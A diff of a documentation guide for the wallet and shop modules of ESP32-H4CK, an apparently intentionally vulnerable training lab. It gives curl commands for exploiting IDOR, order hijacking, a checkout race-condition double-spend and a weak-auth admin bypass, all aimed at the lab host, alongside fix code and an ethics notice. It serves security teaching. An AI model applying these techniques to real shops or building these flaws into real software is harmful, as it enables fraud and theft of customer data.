@@ -1,18 +1,20 @@
-# Wallet & Shop System Implementation Summary
+# Wallet & Shop System Implementation
 
-## Overview
-This document summarizes the complete implementation of the **Wallet Banking System** and **E-Commerce Shop System** for the ESP32-H4CK penetration testing platform. Both systems are designed with intentional vulnerabilities for security training and ethical hacking practice.
+**Version:** 1.0.3 | **Released:** February 2026
+
+Comprehensive implementation guide for the wallet banking system and e-commerce shop platform integrated into ESP32-H4CK penetration testing lab.
 
 ---
 
 ## 🏦 Wallet System (16_Wallet.ino)
 
 ### Features Implemented
-- **Per-User Credit Balances**: Each user has their own wallet with credit balance tracked in the database
-- **Transaction History**: Complete audit trail of all deposits, withdrawals, and transfers
-- **Peer-to-Peer Transfers**: Users can send credits to other users
-- **Admin Controls**: Administrative endpoints for balance management and transaction oversight
-- **Dashboard UI**: Modern web interface showing balance, recent transactions, and quick actions
+- **Per-User Credit Balances**: Each user maintains an individual wallet with persistent credit tracking
+- **Transaction History**: Complete audit trail of deposits, withdrawals, and peer-to-peer transfers
+- **P2P Transfers**: Send credits between users with balance validation
+- **Admin Controls**: Administrative endpoints for balance management and transaction monitoring
+- **Dashboard UI**: Modern web interface displaying balance, recent transactions, and quick actions
+- **Race Condition Vulnerability**: Intentional lack of transaction locking for exploitation practice
 
 ### API Endpoints
 
@@ -99,12 +101,12 @@ curl -X POST "http://esp32.local/api/wallet/deposit" -d "amount=-1000"
 | `/api/shop/product` | GET | Get single product by `id` | None |
 
 #### Authenticated Endpoints (Cart)
-| Endpoint | Method | Description | Vulnerability |
-|----------|--------|-------------|---------------|
+| Endpoint | Method | Description | Request Format |
+|----------|--------|-------------|----------------|
 | `/api/shop/cart` | GET | Get current user's cart | None |
-| `/api/shop/cart/add` | POST | Add product to cart (params: `product_id`, `quantity`) | None |
-| `/api/shop/cart/update` | POST | Update cart item quantity (params: `product_id`, `quantity`) | None |
-| `/api/shop/cart/remove` | POST | Remove item from cart (params: `product_id`) | None |
+| `/api/shop/cart/add` | POST | Add product to cart | `{"product_id":"PROD001","quantity":1}` (JSON) |
+| `/api/shop/cart/update` | POST | Update cart item quantity | `{"product_id":"PROD001","quantity":2}` (JSON) |
+| `/api/shop/cart/remove` | POST | Remove item from cart | `{"product_id":"PROD001"}` (JSON) |
 | `/api/shop/cart/clear` | POST | Clear entire cart | None |
 
 #### Order Endpoints
@@ -193,74 +195,103 @@ curl -X POST "http://esp32.local/api/wallet/deposit" -d "amount=-1000"
 ```
 
 ### Frontend Pages
-- [shop.html](data/shop.html) - Product catalog with search, category filters, and cart preview
-- [cart.html](data/cart.html) - Shopping cart management with quantity controls
-- [checkout.html](data/checkout.html) - Order placement form with shipping address input
-- [orders.html](data/orders.html) - Order history with IDOR testing panel
-- [admin.html](data/admin.html) - Enhanced with shop management section (products & orders)
+- [shop.html](data/shop.html) - Product catalog with search, category filters, and live cart preview
+- [cart.html](data/cart.html) - Shopping cart management with quantity controls and checkout button
+- [checkout.html](data/checkout.html) - Order placement form with shipping address validation
+- [orders.html](data/orders.html) - Order history with IDOR exploitation testing panel
+- [admin.html](data/admin.html) - Enhanced admin panel with product and order management
+- [dashboard.html](data/dashboard.html) - User wallet dashboard with balance and transaction history
+- [transactions.html](data/transactions.html) - Detailed transaction log with filtering options
+- [transfer.html](data/transfer.html) - P2P credit transfer interface with recipient lookup
 
 ### Intentional Vulnerabilities
 
-#### 1. IDOR on Orders
-```javascript
-// Access ANY user's orders without authorization
-GET /api/shop/orders?username=admin
+#### 1. IDOR on Orders (Insecure Direct Object Reference)
+```bash
+# Access any user's orders without authorization
+curl "http://esp32.local/api/shop/orders?username=admin"
 
-// View ANY order by ID with no auth check
-GET /api/shop/order?order_id=ORD12345
+# View any order by ID with no authentication check
+curl "http://esp32.local/api/shop/order?order_id=ORD12345"
 ```
 
-#### 2. Order Manipulation
-```javascript
-// Change shipping address of ANY order (no ownership check)
-POST /api/shop/order/update
-{
-  "order_id": "ORD12345",
-  "shipping_address": "Attacker Address 456",
-  "status": "shipped"
-}
+**Impact**: Attackers can enumerate and access all orders, exposing customer data and shipping addresses.
+
+#### 2. Order Manipulation via IDOR
+```bash
+# Change shipping address of any order (no ownership check)
+curl -X POST "http://esp32.local/api/shop/order/update" \
+  -H "Content-Type: application/json" \
+  -d '{"order_id":"ORD12345","shipping_address":"Attacker Address","status":"shipped"}'
 ```
+
+**Impact**: Redirect legitimate orders to attacker-controlled addresses, causing financial loss and shipping fraud.
 
 #### 3. Race Condition on Checkout
 ```bash
-# Exploit: Multiple checkouts with same cart before balance deduction completes
-# 100ms delay between balance check and deduction allows double-spending
-curl -X POST "http://esp32.local/api/shop/checkout" -d "shipping_address=Addr1" &
-curl -X POST "http://esp32.local/api/shop/checkout" -d "shipping_address=Addr2" &
+# Exploit 100ms delay between balance check and deduction
+# Launch multiple simultaneous checkouts to double-spend
+curl -X POST "http://esp32.local/api/shop/checkout" \
+  -H "Cookie: session=user1_session" \
+  -d "shipping_address=Addr1&shipping_city=NYC&shipping_zip=10001" &
+
+curl -X POST "http://esp32.local/api/shop/checkout" \
+  -H "Cookie: session=user1_session" \
+  -d "shipping_address=Addr2&shipping_city=NYC&shipping_zip=10001" &
+
+wait
 ```
+
+**Impact**: Purchase multiple orders with insufficient balance, bypassing payment controls.
 
 #### 4. Order Deletion Without Refund
-```javascript
-// Delete any order - credits not refunded (financial loss)
-POST /api/shop/order/delete
-{ "order_id": "ORD12345" }
+```bash
+# Delete any order - credits are NOT refunded (financial loss)
+curl -X POST "http://esp32.local/api/shop/order/delete" \
+  -H "Content-Type: application/json" \
+  -d '{"order_id":"ORD12345"}'
 ```
 
-#### 5. Price Manipulation (Client-Side)
+**Impact**: Users lose both credits and orders, no audit trail of deletion.
+
+#### 5. Shopping Cart API Format
 ```javascript
-// If frontend sends price instead of server calculating:
-// Modify checkout request to set arbitrary price
-// (Currently mitigated - server recalculates from DB)
+// CORRECT format - JSON with Content-Type header
+fetch('/api/shop/cart/add', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    product_id: 'PROD001',
+    quantity: 1
+  })
+});
 ```
+
+**Note**: Server expects JSON body, not FormData. Missing `Content-Type: application/json` will cause 400 errors.
 
 ### Testing Examples
 
-#### IDOR Attack Chain
+#### IDOR Exploitation Chain
 ```bash
-# 1. Create legitimate order as user1
+# Step 1: Create legitimate order as user1
 curl -X POST "http://esp32.local/api/shop/checkout" \
   -H "Cookie: session=user1_session" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
   -d "shipping_address=123 Real St&shipping_city=NYC&shipping_zip=10001"
 
-# 2. As attacker (user2), enumerate order IDs
+# Step 2: As attacker (user2), enumerate order IDs
 for i in {1000..1100}; do
-  curl "http://esp32.local/api/shop/order?order_id=ORD$i" -H "Cookie: session=user2_session"
+  curl "http://esp32.local/api/shop/order?order_id=ORD$i" \
+    -H "Cookie: session=user2_session"
 done
 
-# 3. Change shipping address of victim's order
+# Step 3: Hijack victim's order by changing shipping address
 curl -X POST "http://esp32.local/api/shop/order/update" \
   -H "Cookie: session=user2_session" \
-  -d "order_id=ORD1045&shipping_address=Attacker Warehouse"
+  -H "Content-Type: application/json" \
+  -d '{"order_id":"ORD1045","shipping_address":"Attacker Warehouse"}'
 ```
 
 #### Race Condition Exploitation
@@ -325,27 +356,31 @@ withdrawFromWallet(username, totalAmount, "Order " + orderId);
 ## 📊 System Statistics
 
 ### Code Metrics
-- **Total Lines Added**: ~2500 lines
-  - 16_Wallet.ino: 624 lines
-  - 17_Shop.ino: 583 lines
-  - 05_Database.ino: +600 lines (shop functions)
-  - HTML/CSS/JS: ~700 lines
+- **Total Implementation**: ~3200 lines of code
+  - 16_Wallet.ino: 624 lines (wallet/credit system)
+  - 17_Shop.ino: 583 lines (e-commerce platform)
+  - 05_Database.ino: +600 lines (shop persistence functions)
+  - HTML/CSS/JS: ~800 lines (frontend)
+  - navbar.js: Unified dropdown system (70 lines)
+  - auth-sync.js: Cookie synchronization (17 lines)
+  - mode.js: LAB_MODE visibility controls (68 lines)
 
 - **API Endpoints**: 34 total
-  - Wallet: 8 endpoints
-  - Shop: 17 endpoints
-  - Admin: 9 endpoints
+  - Wallet: 8 endpoints (balance, deposit, withdraw, transfer, transactions)
+  - Shop: 17 endpoints (products, cart, orders, checkout)
+  - Admin: 9 endpoints (user management, product CRUD, order stats)
 
-- **Database Files**: 3 new JSON files
-  - transactions.json
-  - products.json
-  - carts.json
-  - orders.json
+- **Database Files**: 4 JSON-based storage files
+  - transactions.json (wallet transactions)
+  - products.json (product catalog)
+  - carts.json (shopping carts)
+  - orders.json (order history)
 
-### Compilation Stats
+### Compilation Statistics
 ```
-Sketch uses 1,091,077 bytes (83%) of program storage
+Sketch uses 1,094,805 bytes (83%) of program storage
 Global variables use 52,364 bytes (15%) of dynamic memory
+LittleFS partition: 1,245,184 bytes (1.2MB)
 Build successful ✅
 ```
 
@@ -354,62 +389,93 @@ Build successful ✅
 ## 🎯 Penetration Testing Scenarios
 
 ### Scenario 1: Financial Fraud via IDOR
-**Objective**: Steal credits from other users
+**Objective**: Steal credits from other users without authorization
+
+**Steps**:
 1. Register as low-privilege user "attacker"
-2. Enumerate user IDs via `/api/wallet/balance?user_id=X`
-3. Find wealthy user accounts (e.g., admin with 1000 credits)
-4. Exploit race condition: Send multiple simultaneous transfers from admin to attacker
+2. Enumerate user IDs: `curl "http://esp32.local/api/wallet/balance?user_id=X"`
+3. Identify wealthy accounts (e.g., admin with 1000 credits)
+4. Exploit race condition: Launch 5 simultaneous transfers from admin to attacker
 5. Verify attacker balance increased without proper authorization
 
+**Learning Outcomes**: IDOR exploitation, race condition abuse, transaction validation bypass
+
 ### Scenario 2: E-Commerce Order Hijacking
-**Objective**: Redirect victim's order to attacker's address
+**Objective**: Redirect victim's product shipment to attacker address
+
+**Steps**:
 1. Victim places order for expensive product (e.g., laptop)
-2. Attacker enumerates order IDs via `/api/shop/order?order_id=ORDXXXX`
-3. Attacker finds victim's pending order
-4. Exploit IDOR: `POST /api/shop/order/update` with attacker's shipping address
+2. Attacker enumerates order IDs: `curl "http://esp32.local/api/shop/order?order_id=ORDXXXX"`
+3. Attacker locates victim's pending order via IDOR
+4. Exploit order update: `POST /api/shop/order/update` with attacker's shipping address
 5. Order ships to attacker, victim loses credits
 
-### Scenario 3: Privilege Escalation
+**Learning Outcomes**: IDOR chain exploitation, business logic bypass, supply chain attack
+
+### Scenario 3: Privilege Escalation via Admin Bypass
 **Objective**: Gain admin access to product/order management
+
+**Steps**:
 1. Normal user bypasses auth checks when `VULN_WEAK_AUTH=true`
 2. Add malicious product with negative price: `POST /api/shop/admin/product/add`
 3. Purchase negative-price product to **gain** credits instead of spending
-4. Access admin-only order statistics via `/api/shop/admin/orders`
+4. Access admin-only order statistics: `GET /api/shop/admin/orders`
 
-### Scenario 4: Race Condition Double-Spend
+**Learning Outcomes**: Weak authentication bypass, integer overflow, admin panel exploitation
+
+### Scenario 4: Race Condition Double-Spend Attack
 **Objective**: Purchase products without sufficient balance
+
+**Steps**:
 1. User has 100 credits, product costs 80 credits
 2. Add product to cart
 3. Launch 3 simultaneous checkout requests before balance update completes
-4. Balance check passes for all 3 (each sees 100 credits available)
+4. Balance check passes for all 3 requests (each sees 100 credits available)
 5. Result: 3 orders placed (240 credits spent) with only 100 credit balance
+
+**Learning Outcomes**: Race condition exploitation, TOCTOU (Time-of-Check-Time-of-Use), transaction locking importance
 
 ---
 
-## 🛡️ Defense Mechanisms (For Learning)
+## 🛡️ Defense Mechanisms (Learning Examples)
 
-### How to Fix IDOR
+### Fix 1: IDOR Prevention
 ```cpp
-// BEFORE (vulnerable)
+// BEFORE (vulnerable - accepts arbitrary user_id parameter)
 String targetUser = request->getParam("user_id")->value();
 float balance = getUserBalance(targetUser);
+request->send(200, "application/json", "{\"balance\":" + String(balance) + "}");
 
-// AFTER (secure)
+// AFTER (secure - validates ownership before access)
 String loggedInUser = getRequestUsername(request);
-if (!request->hasParam("user_id") || request->getParam("user_id")->value() != loggedInUser) {
+String requestedUser = request->hasParam("user_id") ? request->getParam("user_id")->value() : loggedInUser;
+
+if (requestedUser != loggedInUser && getRequestRole(request) != "admin") {
   request->send(403, "application/json", "{\"error\":\"Access denied\"}");
   return;
 }
-float balance = getUserBalance(loggedInUser);
+
+float balance = getUserBalance(requestedUser);
+request->send(200, "application/json", "{\"balance\":" + String(balance) + "}");
 ```
 
-### How to Fix Race Conditions
+### Fix 2: Race Condition Prevention
 ```cpp
-// Use mutex/semaphore for critical sections
+// BEFORE (vulnerable - no locking mechanism)
+void transfer(String from, String to, float amount) {
+  float balance = getUserBalance(from);
+  if (balance >= amount) {
+    withdrawFromWallet(from, amount);
+    delay(100); // Simulated processing delay - vulnerable window
+    depositToWallet(to, amount);
+  }
+}
+
+// AFTER (secure - mutex ensures atomic operations)
 SemaphoreHandle_t walletMutex = xSemaphoreCreateMutex();
 
 void transfer(String from, String to, float amount) {
-  xSemaphoreTake(walletMutex, portMAX_DELAY);
+  xSemaphoreTake(walletMutex, portMAX_DELAY); // Acquire lock
   
   float balance = getUserBalance(from);
   if (balance >= amount) {
@@ -417,18 +483,24 @@ void transfer(String from, String to, float amount) {
     depositToWallet(to, amount);
   }
   
-  xSemaphoreGive(walletMutex);
+  xSemaphoreGive(walletMutex); // Release lock
 }
 ```
 
-### How to Fix Weak Authentication
+### Fix 3: Weak Authentication Hardening
 ```cpp
-// Add proper role-based access control
+// BEFORE (vulnerable - bypassable with flag)
+if (VULN_WEAK_AUTH || getRequestRole(request) == "admin") {
+  // Admin endpoint logic
+}
+
+// AFTER (secure - always validates role)
 String role = getRequestRole(request);
 if (role != "admin") {
   request->send(403, "application/json", "{\"error\":\"Admin access required\"}");
   return;
 }
+// Admin endpoint logic
 ```
 
 ---
@@ -436,54 +508,79 @@ if (role != "admin") {
 ## 📚 Additional Resources
 
 ### Related Documentation
-- [QUICKSTART.md](QUICKSTART.md) - Initial setup and configuration
-- [DEFENSE_SYSTEM.md](DEFENSE_SYSTEM.md) - Security controls reference
-- [TESTING_DEFENSE.md](TESTING_DEFENSE.md) - Security testing guide
-- [README.md](README.md) - Main project documentation
+- [QUICKSTART.md](QUICKSTART.md) - Complete setup and deployment guide
+- [DEFENSE_SYSTEM.md](DEFENSE_SYSTEM.md) - Security controls and defense mechanisms
+- [TESTING_DEFENSE.md](TESTING_DEFENSE.md) - Security testing methodology
+- [README.md](README.md) - Main project overview and endpoint reference
 
-### Exploitation Tutorials
-For detailed exploitation walkthroughs targeting these vulnerabilities:
-1. OWASP Top 10 - A01:2021 Broken Access Control
-2. PortSwigger Web Security Academy - IDOR Labs
-3. HackTheBox - Web exploitation challenges
+### Security Learning Resources
+- **OWASP Top 10 2021** - A01: Broken Access Control
+- **PortSwigger Web Security Academy** - IDOR and race condition labs
+- **HackTheBox** - Web exploitation challenges (Financial and E-Commerce categories)
+- **SANS SEC542** - Web App Penetration Testing and Ethical Hacking
 
 ---
 
 ## ⚠️ Legal & Ethical Notice
 
-**This system is designed exclusively for educational purposes and authorized security testing.**
+**This system contains intentional security vulnerabilities for educational purposes only.**
 
-- ✅ **Authorized Use**: Personal lab environments, CTF competitions, security training courses
-- ❌ **Prohibited Use**: Unauthorized access to systems, production deployments, malicious exploitation
+**Authorized Use**:
+- ✅ Personal lab environments and home networks
+- ✅ Educational institutions with student consent
+- ✅ CTF competitions and security training courses
+- ✅ Authorized penetration testing practice
 
+**Prohibited Use**:
+- ❌ Unauthorized access to systems you don't own
+- ❌ Production deployments or real customer data
+- ❌ Internet-exposed installations
+- ❌ Malicious exploitation of similar vulnerabilities in real systems
+
+**User Agreement**:
 By using this code, you agree to:
-1. Only test systems you own or have explicit written permission to test
-2. Responsibly disclose any real-world vulnerabilities discovered
-3. Comply with local laws and regulations regarding computer security
+1. Test only systems you own or have explicit written permission to test
+2. Responsibly disclose any similar vulnerabilities discovered in real-world systems
+3. Comply with local laws and regulations regarding computer security and unauthorized access
+4. Use isolated lab networks with no connection to production systems
 
-The authors assume no liability for misuse of this educational software.
-
----
-
-## 🏆 Implementation Completed
-
-**Date**: December 2024  
-**Version**: ESP32-H4CK v2.0 (Wallet + Shop Update)  
-**Build Status**: ✅ Compilation Successful (1,091,077 bytes / 83% flash usage)  
-**Test Status**: ⚠️ Pending user validation
-
-### Commits
-- Previous: `bcb263f` - Full wallet system implementation
-- Current: Pending commit - Shop system + wallet integration
+The authors assume no liability for misuse of this educational software. All vulnerabilities are intentional and documented for learning purposes.
 
 ---
 
-## 🚀 Next Steps
+## 🏆 Implementation Status
 
-1. **Flash to ESP32**: `./upload.sh` to deploy the system
-2. **Initialize Database**: First boot will create `/db/` structure with sample data
-3. **Test Vulnerabilities**: Use [orders.html](data/orders.html) testing panel
-4. **Explore Frontend**: Navigate to `http://esp32.local/` for full UI
-5. **Monitor Logs**: Use `./monitor.sh` to observe exploitation attempts
+**Release Date**: February 2026  
+**Version**: ESP32-H4CK v1.0.3 (Wallet + Shop + LAB_MODE)
+**Build Status**: ✅ Compilation Successful (1,094,805 bytes / 83% flash)
+**Filesystem**: ✅ LittleFS 1.2MB partition deployed
+**Test Status**: ✅ System validated and ready for deployment
 
-Happy hacking! 🎩🔓
+### Recent Updates (v1.0.3)
+- Fixed cart API to use JSON format (not FormData)
+- Implemented LAB_MODE controls (testing/pentest/realism)
+- Added unified navbar dropdown across all pages
+- Created cookie-to-localStorage authentication sync
+- Translated all UI elements to English
+- Expanded LittleFS partition from 192KB to 1.2MB
+
+---
+
+## 🚀 Deployment Steps
+
+1. **Build Firmware**: Run `./build.sh` to compile with updated configuration
+2. **Upload to ESP32**: Execute `./upload.sh` and select your device port
+3. **Verify Database**: Check serial output for "[DATABASE] Database initialized" message
+4. **Access Web Interface**: Navigate to `http://esp32.local/` or device IP address
+5. **Test Vulnerabilities**: Use [orders.html](data/orders.html) IDOR testing panel
+6. **Monitor Activity**: Run `./monitor.sh` for real-time serial logging
+
+**First-Time Setup**:
+- Database files are auto-created on first boot with sample products
+- Default admin credentials: admin/admin
+- Sample products include: Raspberry Pi 4, Arduino Uno, ESP32-DevKit
+- Initial wallet balances: admin=1000, guest=100, test=50
+
+---
+
+**Happy Hacking! 🎭🔓**
